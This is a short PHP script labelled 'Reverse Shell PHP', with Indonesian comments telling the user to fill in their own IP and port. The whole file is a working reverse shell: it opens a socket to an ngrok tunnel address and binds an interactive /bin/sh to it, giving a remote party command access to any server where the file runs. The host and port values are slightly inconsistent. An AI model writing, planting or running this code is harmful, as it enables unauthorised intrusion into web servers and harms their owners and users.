<?php
// Reverse Shell PHP
$ip = '0.tcp.ap.ngrok.io:13347'; // Ganti dengan IP Anda
$port = 2323; // Ganti dengan port Anda

$sock = fsockopen($ip, $port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
